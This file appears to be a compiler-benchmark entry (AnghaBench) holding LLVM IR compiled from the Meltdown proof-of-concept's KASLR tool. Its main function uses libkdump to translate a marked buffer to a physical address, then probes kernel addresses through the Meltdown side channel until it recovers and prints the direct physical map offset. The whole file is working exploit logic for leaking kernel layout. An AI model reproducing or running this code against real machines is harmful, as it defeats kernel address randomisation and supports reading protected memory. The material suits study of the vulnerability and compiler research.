; ModuleID = '/home/carl/AnghaBench/meltdown/extr_kaslr.c_main.c'
source_filename = "/home/carl/AnghaBench/meltdown/extr_kaslr.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32 }

@DEFAULT_PHYSICAL_OFFSET = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [90 x i8] c"\1B[31;1m[!]\1B[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\0A\00", align 1
@.str.1 = private unnamed_addr constant [62 x i8] c"\0D\1B[32;1m[+]\1B[0m Direct physical map offset: \1B[33;1m0x%zx\1B[0m\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"\0D\1B[34;1m[%c]\1B[0m 0x%zx    \00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"/-\\|\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4096 x i64], align 16
  %7 = alloca %struct.TYPE_4__, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca %struct.TYPE_4__, align 4
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i64, i64* @DEFAULT_PHYSICAL_OFFSET, align 8
  store i64 %16, i64* %8, align 8
  store i64 34359738368, i64* %9, align 8
  %17 = load i64, i64* %9, align 8
  %18 = mul i64 -2, %17
  store i64 %18, i64* %10, align 8
  store i32 0, i32* %11, align 4
  %19 = call i32 @libkdump_enable_debug(i32 0)
  %20 = call i64 (...) @libkdump_get_autoconfig()
  %21 = bitcast %struct.TYPE_4__* %12 to i64*
  store i64 %20, i64* %21, align 4
  %22 = bitcast %struct.TYPE_4__* %7 to i8*
  %23 = bitcast %struct.TYPE_4__* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %22, i8* align 4 %23, i64 8, i1 false)
  %24 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 0
  store i32 10, i32* %24, align 4
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %7, i32 0, i32 1
  store i32 1, i32* %25, align 4
  %26 = bitcast %struct.TYPE_4__* %7 to i64*
  %27 = load i64, i64* %26, align 4
  %28 = call i32 @libkdump_init(i64 %27)
  %29 = getelementptr inbounds [4096 x i64], [4096 x i64]* %6, i64 0, i64 0
  %30 = getelementptr inbounds i64, i64* %29, i64 2048
  %31 = ptrtoint i64* %30 to i64
  store i64 %31, i64* %13, align 8
  %32 = load i64, i64* %13, align 8
  %33 = inttoptr i64 %32 to i8*
  store i8 88, i8* %33, align 1
  %34 = load i64, i64* %13, align 8
  %35 = call i64 @libkdump_virt_to_phys(i64 %34)
  store i64 %35, i64* %14, align 8
  %36 = load i64, i64* %14, align 8
  %37 = icmp ne i64 %36, 0
  br i1 %37, label %41, label %38

38:                                               ; preds = %2
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str, i64 0, i64 0))
  %40 = call i32 @exit(i32 1) #4
  unreachable

41:                                               ; preds = %2
  br label %42

42:                                               ; preds = %41, %92
  %43 = load i64, i64* %13, align 8
  %44 = inttoptr i64 %43 to i8*
  store volatile i8 88, i8* %44, align 1
  %45 = load i64, i64* %13, align 8
  %46 = inttoptr i64 %45 to i8*
  store volatile i8 88, i8* %46, align 1
  %47 = load i64, i64* %13, align 8
  %48 = inttoptr i64 %47 to i8*
  store volatile i8 88, i8* %48, align 1
  %49 = load i64, i64* %13, align 8
  %50 = inttoptr i64 %49 to i8*
  store volatile i8 88, i8* %50, align 1
  %51 = load i64, i64* %13, align 8
  %52 = inttoptr i64 %51 to i8*
  store volatile i8 88, i8* %52, align 1
  %53 = load i64, i64* %14, align 8
  %54 = load i64, i64* %8, align 8
  %55 = add i64 %53, %54
  %56 = load i64, i64* %10, align 8
  %57 = add i64 %55, %56
  %58 = call i32 @libkdump_read(i64 %57)
  store i32 %58, i32* %15, align 4
  %59 = load i32, i32* %15, align 4
  %60 = icmp eq i32 %59, 88
  br i1 %60, label %61, label %68

61:                                               ; preds = %42
  %62 = load i64, i64* %8, align 8
  %63 = load i64, i64* %10, align 8
  %64 = add i64 %62, %63
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.1, i64 0, i64 0), i64 %64)
  %66 = load i32, i32* @stdout, align 4
  %67 = call i32 @fflush(i32 %66)
  br label %93

68:                                               ; preds = %42
  %69 = load i64, i64* %9, align 8
  %70 = load i64, i64* %10, align 8
  %71 = add i64 %70, %69
  store i64 %71, i64* %10, align 8
  %72 = load i64, i64* %10, align 8
  %73 = load i64, i64* %8, align 8
  %74 = sub i64 -1, %73
  %75 = icmp uge i64 %72, %74
  br i1 %75, label %76, label %79

76:                                               ; preds = %68
  store i64 0, i64* %10, align 8
  %77 = load i64, i64* %9, align 8
  %78 = lshr i64 %77, 4
  store i64 %78, i64* %9, align 8
  br label %79

79:                                               ; preds = %76, %68
  %80 = load i32, i32* %11, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %11, align 4
  %82 = sdiv i32 %80, 400
  %83 = srem i32 %82, 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [5 x i8], [5 x i8]* @.str.3, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i64, i64* %8, align 8
  %89 = load i64, i64* %10, align 8
  %90 = add i64 %88, %89
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i32 %87, i64 %90)
  br label %92

92:                                               ; preds = %79
  br label %42

93:                                               ; preds = %61
  %94 = call i32 (...) @libkdump_cleanup()
  ret i32 0
}

declare dso_local i32 @libkdump_enable_debug(i32) #1

declare dso_local i64 @libkdump_get_autoconfig(...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @libkdump_init(i64) #1

declare dso_local i64 @libkdump_virt_to_phys(i64) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @libkdump_read(i64) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @libkdump_cleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
